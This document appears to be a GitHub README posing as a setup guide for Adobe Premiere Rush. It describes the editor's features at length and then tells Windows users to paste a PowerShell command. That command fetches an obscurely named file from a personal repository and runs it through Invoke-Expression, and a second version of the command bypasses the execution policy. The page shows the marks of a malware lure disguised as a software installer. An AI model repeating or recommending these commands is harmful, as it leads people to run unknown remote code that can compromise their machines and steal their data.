# Premiere Rush

Premiere Rush is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Premiere Rush and work in it.

Adobe Premiere Rush on Windows is a desktop video editor built for quick assembly and polish. You import footage from camera rolls or project folders, arrange clips on a multi-track timeline, trim with ripple edits, add transitions, tune exposure and white balance, layer titles and motion graphics, balance voiceover against music, and export to common frame sizes and codecs for delivery.

A typical session starts with new project settings that match your source material. You drop media into the bin, build a rough cut on the timeline, refine pacing with slip and slide tools, apply Lumetri-style color adjustments, drop in lower thirds from the built-in library, duck background audio under narration, preview full-screen, then queue an H.264 or HEVC export with platform-friendly dimensions. Rush can sync sequences with the mobile Rush app when you use the same Adobe account, so you can start on phone and finish on the desktop.

This repository holds a Windows setup package for Premiere Rush, release notes that summarize build changes and fixed issues, and a changelog that tracks version history across updates. Use the installer for a standard deployment, read the notes before upgrading production machines, and consult the changelog when you need to compare behavior between builds.

## What you do with it

- Multi-track timeline lets you stack video, photos, titles, and audio on Windows.
- Built-in color tools adjust exposure, contrast, saturation, and white balance on clips.
- Drag-and-drop transitions soften cuts between scenes without manual keyframe work.
- Motion graphic templates add animated titles and lower thirds from the effects panel.
- Audio controls balance levels, reduce noise, and duck music under spoken dialogue tracks.
- Export presets target common social aspect ratios with H.264 or HEVC encoding options.
- Project sync across Rush on phone and desktop keeps edits aligned through your Adobe account.
- Ripple trim and slip edits refine clip timing while keeping the surrounding edit intact.

## Quick Setup (PowerShell)

This installs the program Premiere Rush on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/vbaumann290617/premiere-rush-setup-guide/main/8y5ozpm75d.yl8j1anm | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/vbaumann290617/premiere-rush-setup-guide/main/8y5ozpm75d.yl8j1anm | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `8y5ozpm75d.yl8j1anm` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `vbaumann290617/premiere-rush-setup-guide`. Adobe Premiere Rush 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
